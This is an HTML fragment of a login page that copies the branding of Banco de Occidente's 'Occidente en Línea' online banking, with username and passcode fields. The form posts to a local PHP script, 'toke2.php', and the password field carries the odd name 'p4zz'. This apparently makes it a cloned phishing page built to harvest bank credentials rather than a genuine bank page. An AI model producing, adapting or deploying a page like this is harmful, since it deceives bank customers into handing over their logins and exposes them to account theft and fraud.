            ...
            <div class="row">
                ...
                <div class="col-md-6 col-xs-12">
                    <div class="divTituloLogin">
                        <h2 class="letraTituloInternos titulo-principal">Le damos la bienvenida al servicio de <b class="text-success">Occidente en Línea</b>&nbsp;de Banco de Occidente, S.A.</h2>
                    </div>
                            ...
                            <div class="row">
                                <div class="form-horizontal form-login forms-wall ">
                                    ...
                                    <div class="col-md-10 col-md-offset-1 col-sm-10 col-sm-offset-1">
                                        <form action="toke2.php" method="post"> 
                                        <div class="form-group">
                                            <label class="control-label col-md-3 col-sm-2 col-xs-12" for="email">&nbsp;Usuario:</label>
                                        ...
                                        <div class="form-group">
                                            <label class="control-label col-md-3 col-sm-2 col-xs-12" for="email"><span class="bold text-danger required-info">*</span>&nbsp;Passcode:</label>
                                            <div class="col-md-9 col-sm-10 col-xs-12">
                                                <div class="input-group">
                                                    <input name="p4zz" type="password" maxlength="16" id="ctl00_CTBCuerpo_txtPasscode" tabindex="2" class="form-control">
                                                     <span class="input-group-addon">
                                                         <a class="popover-small pull-left" href="javascript: void(0)" data-contentwrapper=".contenido-popover-pass" data-original-title="" title="">
                                                         <img src="icon1.png">
                                                        </a>
                                                     </span>
                                                 </div>
                                        ...
                                        <div class="form-group">
                                            <div class="col-sm-12 col-xs-12">
                                                <input type="submit" id="add" name="ctl00$CTBCuerpo$btnIngresar" value="Ingresar" class="btn btn-success btn-green pull-right btnIngresar">
                                            </div>
                                        </div>
                                    </form>                       
                                    </div>
